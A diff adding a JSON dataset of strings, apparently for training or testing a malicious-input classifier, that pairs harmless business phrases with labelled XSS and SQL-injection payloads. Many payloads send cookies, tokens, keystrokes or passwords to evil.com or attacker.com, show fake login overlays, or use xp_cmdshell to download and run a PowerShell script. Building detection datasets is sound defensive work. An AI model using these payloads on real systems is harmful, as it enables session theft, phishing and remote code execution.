@@ -1,0 +1,3618 @@
+[
+   {
+      "value":"Hello world",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>alert('1')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Welcome to our website",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Thank you for your submission",
+      "isMalicious":0
+   },
+   {
+      "value":"'; DROP TABLE users; --",
+      "isMalicious":1
+   },
+   {
+      "value":"Please contact us at support@example.com",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"x\" onerror=\"alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The meeting is scheduled for tomorrow",
+      "isMalicious":0
+   },
+   {
+      "value":"javascript:alert(document.cookie)",
+      "isMalicious":1
+   },
+   {
+      "value":"Happy birthday!",
+      "isMalicious":0
+   },
+   {
+      "value":"<body onload=alert('XSS')>",
+      "isMalicious":1
+   },
+   {
+      "value":"This is a test message",
+      "isMalicious":0
+   },
+   {
+      "value":"' OR '1'='1",
+      "isMalicious":1
+   },
+   {
+      "value":"I agree with the terms and conditions",
+      "isMalicious":0
+   },
+   {
+      "value":"<div style=\"position:absolute;top:0;left:0;width:100%;height:100%\" onclick=\"location.href='http://evil.com'\"></div>",
+      "isMalicious":1
+   },
+   {
+      "value":"Please review the attached document",
+      "isMalicious":0
+   },
+   {
+      "value":"eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='))",
+      "isMalicious":1
+   },
+   {
+      "value":"No, I don't need additional information",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"javascript:alert(`xss`);\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Are you available for a meeting tomorrow?",
+      "isMalicious":0
+   },
+   {
+      "value":"\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's schedule a call next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg onload=alert(1)>",
+      "isMalicious":1
+   },
+   {
+      "value":"Can you share the project timeline?",
+      "isMalicious":0
+   },
+   {
+      "value":"'; exec master..xp_cmdshell 'nslookup evil.com'--",
+      "isMalicious":1
+   },
+   {
+      "value":"Please find the information you requested",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"javascript:alert('XSS')\">Click me</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll send you the report by Friday",
+      "isMalicious":0
+   },
+   {
+      "value":"UNION SELECT username,password FROM users",
+      "isMalicious":1
+   },
+   {
+      "value":"Looking forward to hearing from you",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The deadline has been extended",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"invalid\" onerror=\"(function(){window.top.location='http://phishing.com'})();\">",
+      "isMalicious":1
+   },
+   {
+      "value":"I need more information about this topic",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>new Image().src=\"http://evil.com/steal.php?cookie=\"+document.cookie;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We're launching the new product next month",
+      "isMalicious":0
+   },
+   {
+      "value":"' WAITFOR DELAY '0:0:10'--",
+      "isMalicious":1
+   },
+   {
+      "value":"Please confirm your attendance",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var img=new Image(); img.src=\"http://attacker.com/?c=\"+document.cookie;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Thank you for your feedback",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<scr'+'ipt src=\"http://evil.com/script.js\"></scr'+'ipt>')</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll be out of office next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Can you please provide more details?",
+      "isMalicious":0
+   },
+   {
+      "value":"'; EXEC xp_cmdshell 'powershell IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'--",
+      "isMalicious":1
+   },
+   {
+      "value":"The project is on track",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>location.href='http://evil.com?'+document.cookie</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've attached the requested document",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Object.defineProperty(window, 'name', {value:'<img src=x onerror=alert(1)>'})</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The meeting has been rescheduled",
+      "isMalicious":0
+   },
+   {
+      "value":"' OR 1=1; DROP TABLE users; --",
+      "isMalicious":1
+   },
+   {
+      "value":"Did you receive my previous email?",
+      "isMalicious":0
+   },
+   {
+      "value":"<script src=\"https://evil.com/malicious.js\"></script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Here's the summary of our discussion",
+      "isMalicious":0
+   },
+   {
+      "value":"<div onmouseover=\"javascript:alert('XSS')\">Hover over me</div>",
+      "isMalicious":1
+   },
+   {
+      "value":"Can you share your thoughts on this?",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.location='https://evil.com/?cookie='+encodeURIComponent(document.cookie)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm working on the presentation",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll follow up with you next week",
+      "isMalicious":0
+   },
+   {
+      "value":"admin' --",
+      "isMalicious":1
+   },
+   {
+      "value":"The design looks great",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>(function(){var s=document.createElement('script');s.src='https://evil.com/steal.js';document.body.appendChild(s)})();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Can we reschedule our meeting?",
+      "isMalicious":0
+   },
+   {
+      "value":"<s c r i p t>alert('XSS')</s c r i p t>",
+      "isMalicious":1
+   },
+   {
+      "value":"I agree with your proposal",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"javascript:alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Let me know if you need anything else",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The issue has been resolved",
+      "isMalicious":0
+   },
+   {
+      "value":"' SLEEP(10)--",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm available for a call tomorrow",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setTimeout('alert(\"XSS\")',1000)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Thank you for your patience",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>console.log(document.cookie)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've shared the documents with you",
+      "isMalicious":0
+   },
+   {
+      "value":"' OR '1'='1'; -- ",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll look into this and get back to you",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('form').action='https://evil.com/steal';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The meeting is confirmed for 3 PM",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var x=document.createElement('script');x.src='https://evil.com/hack.js';document.head.appendChild(x);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Please review the updated version",
+      "isMalicious":0
+   },
+   {
+      "value":"<script src=\"data:text/javascript,alert(document.domain)\"></script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We're making good progress",
+      "isMalicious":0
+   },
+   {
+      "value":"' UNION SELECT password FROM users WHERE username='admin'--",
+      "isMalicious":1
+   },
+   {
+      "value":"The analysis is complete",
+      "isMalicious":0
+   },
+   {
+      "value":"<div style=\"background-image: url('javascript:alert(1)')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"I've reviewed your proposal",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>fetch('https://evil.com', {method:'POST',body:document.cookie})</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's discuss this offline",
+      "isMalicious":0
+   },
+   {
+      "value":"<input onfocus=\"javascript:alert(document.cookie)\" autofocus>",
+      "isMalicious":1
+   },
+   {
+      "value":"Could you provide more context?",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>navigator.sendBeacon('https://evil.com/steal', document.cookie);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've updated the document",
+      "isMalicious":0
+   },
+   {
+      "value":"<body onload=\"javascript:alert('XSS')\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Let me know if this works for you",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<iframe src=\"http://evil.com/phishing.html\" style=\"width:100%;height:100%;position:fixed;top:0;left:0;z-index:1000\"></iframe>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll be in a meeting until 2 PM",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"1\" onerror=\"eval(atob('YWxlcnQoJ1hTUycpOw=='))\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's schedule a follow-up next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.onload = function() { var link=document.getElementsByTagName(\"a\"); link[0].href=\"http://evil.com/\"; }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I need your input on this matter",
+      "isMalicious":0
+   },
+   {
+      "value":"{{constructor.constructor('alert(\"XSS\")')()}}",
+      "isMalicious":1
+   },
+   {
+      "value":"The results are promising",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"javascript:alert(`XSS`)\" style=\"display:none\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's touch base next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.forms[0].action='http://evil.com/steal';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll prepare the report",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>new Function('alert(\"XSS\")')();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Can you share the agenda?",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var xmlHttp = new XMLHttpRequest(); xmlHttp.open('GET', 'https://evil.com/steal?c='+document.cookie, true); xmlHttp.send();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm looking forward to our collaboration",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"The report will be ready by Friday",
+      "isMalicious":0
+   },
+   {
+      "value":"<style>@import 'javascript:alert(\"XSS\")';</style>",
+      "isMalicious":1
+   },
+   {
+      "value":"Can you review this by tomorrow?",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>localStorage.setItem('hack', document.cookie); location='https://evil.com/steal?data='+localStorage.getItem('hack');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've shared the presentation",
+      "isMalicious":0
+   },
+   {
+      "value":"<form action=\"https://evil.com/steal\" method=\"post\" id=\"stealform\"><input type=\"hidden\" name=\"cookie\" value=\"\" id=\"cookie\"></form><script>document.getElementById('cookie').value=document.cookie;document.getElementById('stealform').submit();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The budget has been approved",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var img = new Image(); img.src = 'https://evil.com/log?c=' + escape(document.cookie);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Could you provide feedback on this?",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setTimeout(function(){window.location='https://evil.com/steal?c='+document.cookie},1000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I appreciate your help",
+      "isMalicious":0
+   },
+   {
+      "value":"<div onclick=\"location.href='javascript:alert(1)'\" style=\"cursor:pointer\">Click me</div>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's finalize this by next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.onkeypress = function(e) { fetch('https://evil.com/keylogger?key=' + e.key) };</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The client is happy with the results",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.body.innerHTML='<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999999\"><div style=\"padding:20px\"><h1>Please re-enter your password</h1><form action=\"https://evil.com/steal\"><input type=\"password\" name=\"pw\"><button>Submit</button></form></div></div>';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll send you the details soon",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>history.replaceState(null, null, '../admin');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We need to discuss this further",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.addEventListener('load', function() { document.forms[0].elements[0].value='hacked'; document.forms[0].submit(); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm excited about this opportunity",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe onload=\"this.src='javascript:alert(document.domain)'\" style=\"display:none\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let me know if you have any questions",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.domain='evil.com';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The presentation was well-received",
+      "isMalicious":0
+   },
+   {
+      "value":"<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm working on the solution",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>navigator.serviceWorker.register('https://evil.com/sw.js');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Your feedback is valuable",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>for(var i=0; i<document.forms.length; i++) { document.forms[i].action='https://evil.com/steal'; }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's arrange a meeting next month",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var request = new XMLHttpRequest(); request.open('GET', 'http://evil.com/steal?cookie='+document.cookie); request.send();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm happy to assist with this",
+      "isMalicious":0
+   },
+   {
+      "value":"<script src=\"https://evil.com/malicious.js\" integrity=\"sha256-fake\" crossorigin=\"anonymous\"></script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's review the progress next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.getElementById('csrf_token').value='fake_token';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The contract has been signed",
+      "isMalicious":0
+   },
+   {
+      "value":"<a href=\"#\" onclick=\"fetch('https://api.example.com/delete', {method:'POST',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({id:1})});\">Click here</a>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll forward your request",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.__defineGetter__('x', function() { alert(1) }); x;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The response has been positive",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write(\"<script src='https://evil.com/js/hack.js'></scr\"+\"ipt>\");</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We're working on the implementation",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"x\" usemap=\"#map\"><map name=\"map\"><area href=\"javascript:alert(1)\" shape=\"rect\" coords=\"0,0,1000,1000\"></map>",
+      "isMalicious":1
+   },
+   {
+      "value":"Please provide your availability",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setTimeout(function() { document.body.innerHTML='<img src=\"https://evil.com/fake-captcha.png\" onclick=\"location=\\'https://evil.com/phish\\'\">' }, 2000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The team is working on it",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setInterval(function() { document.querySelectorAll('input[type=password]').forEach(function(el) { el.addEventListener('input', function() { fetch('https://evil.com/steal?pw='+this.value) }) }) }, 1000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I appreciate your prompt response",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.getElementById('login-form').action='https://evil.com/steal';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The shipment will arrive next week",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>(new Image()).src='https://evil.com/steal?cookie='+document.cookie;</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's proceed with the plan",
+      "isMalicious":0
+   },
+   {
+      "value":"<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline' https://evil.com\">",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll get back to you with more information",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<img src=\"https://evil.com/steal?'+document.cookie+'\">');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We should follow up on this",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.location.hash='#<script>alert(\"XSS\")</script>';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The document has been approved",
+      "isMalicious":0
+   },
+   {
+      "value":"data:text/html,<script>alert(document.domain)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's continue our discussion tomorrow",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.addEventListener('DOMContentLoaded', function() { alert('XSS'); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I completed the task",
+      "isMalicious":0
+   },
+   {
+      "value":"<audio src=\"x\" onerror=\"alert(1)\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The deadline is approaching",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.getElementById('output').innerHTML = '<img src=\"x\" onerror=\"alert(1)\">';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We received your application",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>navigator.sendBeacon('https://evil.com/steal', JSON.stringify({cookies: document.cookie, url: location.href}));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Thank you for participating",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var ajaxRequest = new XMLHttpRequest(); ajaxRequest.open('POST', 'https://evil.com/steal', true); ajaxRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); ajaxRequest.send('cookie=' + document.cookie);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll share the results with the team",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>for(var key in localStorage) { new Image().src='https://evil.com/steal?key='+key+'&value='+encodeURIComponent(localStorage[key]); }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The report is ready for review",
+      "isMalicious":0
+   },
+   {
+      "value":"<link rel=\"import\" href=\"javascript:alert(1)\">",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's set up a call",
+      "isMalicious":0
+   },
+   {
+      "value":"<form><button formaction=\"javascript:alert(1)\">Click me</button></form>",
+      "isMalicious":1
+   },
+   {
+      "value":"We're on track to meet the deadline",
+      "isMalicious":0
+   },
+   {
+      "value":"<div style=\"background:url(javascript:alert(1))\">",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm interested in your proposal",
+      "isMalicious":0
+   },
+   {
+      "value":"<details open ontoggle=\"alert(1)\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The product will be released next month",
+      "isMalicious":0
+   },
+   {
+      "value":"<video><source onerror=\"alert(1)\">",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll review your submission",
+      "isMalicious":0
+   },
+   {
+      "value":"<table><svg><script>alert(1)</script></svg></table>",
+      "isMalicious":1
+   },
+   {
+      "value":"The meeting was productive",
+      "isMalicious":0
+   },
+   {
+      "value":"<button autofocus onfocus=\"alert(1)\"></button>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll look into this issue",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe srcdoc=\"<script>alert('XSS')</script>\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"We should consider this option",
+      "isMalicious":0
+   },
+   {
+      "value":"<select><option></option></select><script>alert(1)</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's prioritize this task",
+      "isMalicious":0
+   },
+   {
+      "value":"<template><script>alert(1)</script></template>",
+      "isMalicious":1
+   },
+   {
+      "value":"The requirements are clear",
+      "isMalicious":0
+   },
+   {
+      "value":"<input type=\"text\" value=\"\" onfocus=\"alert(1)\" autofocus>",
+      "isMalicious":1
+   },
+   {
+      "value":"I agree with your recommendation",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('body').innerHTML = '<div>Redirecting to secure page...</div>'; setTimeout(function() { location.href='https://evil.com/fake-login'; }, 2000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The project will be completed on time",
+      "isMalicious":0
+   },
+   {
+      "value":"<math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>--></mglyph></table></mtext></math>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've forwarded your request",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg/onload=\"eval(atob('YWxlcnQoJ1hTUycpOw==\"))\">",
+      "isMalicious":1
+   },
+   {
+      "value":"We need to finalize the agreement",
+      "isMalicious":0
+   },
+   {
+      "value":"<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)></style></mglyph></mtext></math></form>",
+      "isMalicious":1
+   },
+   {
+      "value":"The feedback has been positive",
+      "isMalicious":0
+   },
+   {
+      "value":"<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll help you with this",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.body.innerText='';</script><script>document.write('<div style=\"position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:10000\"><div style=\"text-align:center;padding-top:100px\"><h1>System Error</h1><p>Please login again to continue.</p><form action=\"https://evil.com/steal\" method=\"post\"><input type=\"text\" placeholder=\"Username\"><br><input type=\"password\" placeholder=\"Password\"><br><button>Login</button></form></div></div>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"We're making progress",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"javascript:alert(document.domain)\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's revisit this next quarter",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var xhr = new XMLHttpRequest(); xhr.open('GET', '/api/user_data'); xhr.onload = function() { var data = JSON.parse(xhr.responseText); var img = new Image(); img.src = 'https://evil.com/steal?data=' + encodeURIComponent(JSON.stringify(data)); }; xhr.send();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The team is excited about this project",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setTimeout(\"document.forms[0].action='https://evil.com/steal';\", 2000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll prepare a summary",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"x\" onerror=\"this.src='https://evil.com/steal?'+document.cookie;\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The workshop was informative",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's discuss the next steps",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><script>alert&#40;1&#41;</script></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"The proposal was accepted",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41, 59))</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll keep you updated",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">Click me</text></a></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"The documentation is complete",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<scr'+'ipt>alert(\"XSS\")</scr'+'ipt>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll check with the team",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('form').addEventListener('submit', function(e) { e.preventDefault(); var data = new FormData(this); fetch('https://evil.com/steal', { method: 'POST', body: data }); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The campaign was successful",
+      "isMalicious":0
+   },
+   {
+      "value":"<div onmouseover=\"location.href='javascript:alert(1)'\">Hover me</div>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll address your concerns",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.addEventListener('message', function(e) { eval(e.data); });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The analysis shows positive results",
+      "isMalicious":0
+   },
+   {
+      "value":"<iframe src=\"vbscript:alert(1)\"></iframe>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's coordinate our efforts",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write(unescape('%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E'));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've completed the review",
+      "isMalicious":0
+   },
+   {
+      "value":"<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\"></use></svg>",
+      "isMalicious":1
+   },
+   {
+      "value":"The product is ready for launch",
+      "isMalicious":0
+   },
+   {
+      "value":"<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></embed>",
+      "isMalicious":1
+   },
+   {
+      "value":"We value your feedback",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var ajaxRequest = new XMLHttpRequest(); ajaxRequest.open('GET', 'https://api.example.com/sensitive_data', true); ajaxRequest.onreadystatechange = function() { if (ajaxRequest.readyState === 4) { var img = new Image(); img.src = 'https://evil.com/steal?data=' + encodeURIComponent(ajaxRequest.responseText); } }; ajaxRequest.send();</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'm looking forward to your response",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.body.innerHTML += '<div style=\"position:fixed;bottom:10px;right:10px;background:#fff;border:1px solid #ccc;padding:10px\">Please update your account: <a href=\"https://evil.com/fake-update\">Click here</a></div>';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The solution is effective",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>function b64_to_utf8(str){return decodeURIComponent(escape(window.atob(str)));} eval(b64_to_utf8('YWxlcnQoJ1hTUycpOw=='));</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll focus on this task",
+      "isMalicious":0
+   },
+   {
+      "value":"<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>",
+      "isMalicious":1
+   },
+   {
+      "value":"The data is being processed",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('input[name=\"csrf_token\"]').value='fake_token';</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I've addressed the issue",
+      "isMalicious":0
+   },
+   {
+      "value":"<link rel=\"prefetch\" href=\"javascript:alert(1)\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The customer is satisfied",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var token = document.querySelector('meta[name=\"csrf-token\"]').getAttribute('content'); fetch('https://evil.com/steal?token='+token);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll share this with my colleagues",
+      "isMalicious":0
+   },
+   {
+      "value":"<marquee onstart=\"alert(1)\">XSS</marquee>",
+      "isMalicious":1
+   },
+   {
+      "value":"The presentation is ready",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.write('<script>fetch(\\'https://evil.com/steal?cookie=\\'+document.cookie);</script>');</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll prioritize this request",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var links = document.getElementsByTagName('a'); for(var i=0; i<links.length; i++) { links[i].href = 'https://evil.com/'; }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The project is progressing well",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>window.onload = function() { var buttons = document.getElementsByTagName('button'); for(var i=0; i<buttons.length; i++) { buttons[i].onclick = function() { fetch('https://evil.com/steal?button_clicked=true'); return false; } } }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"Let's schedule a follow-up",
+      "isMalicious":0
+   },
+   {
+      "value":"<img src=\"/\" =_=\" onerror=\"alert(1)\">",
+      "isMalicious":1
+   },
+   {
+      "value":"The quality is excellent",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>Object.defineProperty(window, 'localStorage', { get: function() { fetch('https://evil.com/steal?ls_accessed=true'); return Storage.prototype; } });</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll provide regular updates",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>document.querySelector('.login-button').onclick = function() { var u = document.querySelector('input[name=\"username\"]').value; var p = document.querySelector('input[name=\"password\"]').value; fetch('https://evil.com/steal?u='+u+'&p='+p); return false; }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The metrics are improving",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>setInterval(function() { fetch('https://evil.com/beacon?active=true&url='+encodeURIComponent(location.href)); }, 10000);</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"I'll coordinate with the team",
+      "isMalicious":0
+   },
+   {
+      "value":"<script>var originalFetch = window.fetch; window.fetch = function() { originalFetch('https://evil.com/fetch-intercept?url='+arguments[0]); return originalFetch.apply(this, arguments); }</script>",
+      "isMalicious":1
+   },
+   {
+      "value":"The strategy is effective",
